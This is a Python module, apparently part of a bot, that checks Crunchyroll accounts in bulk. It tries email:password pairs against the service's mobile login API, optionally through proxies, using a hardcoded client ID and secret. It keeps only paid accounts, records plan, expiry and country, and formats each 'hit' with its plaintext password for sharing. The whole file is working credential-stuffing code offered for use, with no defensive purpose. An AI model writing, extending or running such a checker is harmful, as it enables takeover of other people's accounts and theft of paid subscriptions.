"""
bot/modules/crunchyroll.py
~~~~~~~~~~~~~~~~~~~~~~~~~~
Async Crunchyroll account checker using ``aiohttp``.

Ported from the original ``CR.py`` synchronous script.
"""

from __future__ import annotations

import uuid
from datetime import datetime
from typing import Optional

import aiohttp

from bot.utils.logger import setup_logger

log = setup_logger("mod.crunchyroll")

# ── Public API constants (Crunchyroll mobile client) ────────────────────
_CLIENT_ID = "o7uowy7q4lgltbavyhjq"
_CLIENT_SECRET = "lqrjETNx6W7uRnpcDm8wRVj8BChjC1er"
_AUTH_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
_ACCOUNT_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
_BENEFITS_URL = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{guid}/benefits"
_SUBS_URL = "https://beta-api.crunchyroll.com/subs/v4/accounts/{pid}/subscriptions"

_HEADERS = {
    "User-Agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
    "Content-Type": "application/x-www-form-urlencoded",
}

_COUNTRY_MAP = {
    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽",
    "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    "AS": "American Samoa 🇦🇸", "AD": "Andorra 🇦🇩",
    "AO": "Angola 🇦🇴", "AR": "Argentina 🇦🇷",
    "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹",
    "BR": "Brazil 🇧🇷", "CA": "Canada 🇨🇦",
    "FR": "France 🇫🇷", "DE": "Germany 🇩🇪",
    "IN": "India 🇮🇳", "IT": "Italy 🇮🇹",
    "JP": "Japan 🇯🇵", "MX": "Mexico 🇲🇽",
    "ES": "Spain 🇪🇸", "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸",
}


async def check_account(
    email: str,
    password: str,
    session: aiohttp.ClientSession,
    proxy: Optional[str] = None,
) -> Optional[dict]:
    """Check a single Crunchyroll account.

    Returns a dict with hit details on success, or ``None`` on
    failure / free account / bad credentials.
    """
    try:
        # 1. Authenticate
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": _CLIENT_ID,
            "client_secret": _CLIENT_SECRET,
            "device_type": "SamsungTV",
            "device_id": str(uuid.uuid4()),
            "device_name": "Goku",
        }
        async with session.post(
            _AUTH_URL, data=data, headers=_HEADERS, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)
        ) as r1:
            if r1.status != 200:
                return None
            auth = await r1.json()

        token = auth.get("access_token")
        pid = auth.get("profile_id")
        if not token:
            return None

        auth_headers = {**_HEADERS, "Authorization": f"Bearer {token}"}

        # 2. Account details
        async with session.get(
            _ACCOUNT_URL, headers=auth_headers, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r2:
            acc = await r2.json()

        email_verified = acc.get("email_verified", False)
        guid = acc.get("external_id")
        if not guid:
            return None

        # 3. Subscription / benefits
        async with session.get(
            _BENEFITS_URL.format(guid=guid), headers=auth_headers,
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=10),
        ) as r3:
            benefits = await r3.json()

        if benefits.get("total", 0) == 0:
            return None  # Free account.

        country_code = benefits.get("subscription_country", "Unknown")
        country_full = _COUNTRY_MAP.get(country_code, country_code)

        raw_benefit = str(benefits.get("items", []))
        if "streams.6" in raw_benefit:
            plan = "ULTIMATE FAN"
        elif "streams.4" in raw_benefit:
            plan = "MEGA FAN"
        elif "streams.1" in raw_benefit:
            plan = "FAN"
        else:
            plan = "Premium"

        # 4. Expiry / renewal date
        expiry = "N/A"
        remaining = "0"
        async with session.get(
            _SUBS_URL.format(pid=pid), headers=auth_headers,
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=10),
        ) as r4:
            subs_data = await r4.json()

        for sub in subs_data.get("subscriptions", []):
            nrd = sub.get("nextRenewalDate")
            if nrd:
                expiry = nrd.split("T")[0]
                try:
                    exp_dt = datetime.strptime(expiry, "%Y-%m-%d")
                    remaining = str((exp_dt - datetime.now()).days)
                except ValueError:
                    pass
                break

        return {
            "email": email,
            "password": password,
            "email_verified": email_verified,
            "plan": plan,
            "expiry": expiry,
            "remaining_days": remaining,
            "country": country_full,
        }

    except (aiohttp.ClientError, TimeoutError, KeyError, TypeError) as exc:
        log.debug("CR check failed for %s: %s", email, exc)
        return None


def format_hit(hit: dict) -> str:
    """Format a hit dictionary into a user-friendly string."""
    return (
        f"🍥 **Crunchyroll Hit**\n"
        f"┣ **Email:** `{hit['email']}`\n"
        f"┣ **Password:** `{hit['password']}`\n"
        f"┣ **Verified:** {hit['email_verified']}\n"
        f"┣ **Plan:** {hit['plan']}\n"
        f"┣ **Expiry:** {hit['expiry']}\n"
        f"┣ **Remaining:** {hit['remaining_days']} days\n"
        f"┗ **Country:** {hit['country']}"
    )


def format_hit_line(hit: dict) -> str:
    """One-line format for results file."""
    return (
        f"{hit['email']}:{hit['password']} | "
        f"Plan={hit['plan']} | Expiry={hit['expiry']} | "
        f"Days={hit['remaining_days']} | Country={hit['country']}"
    )
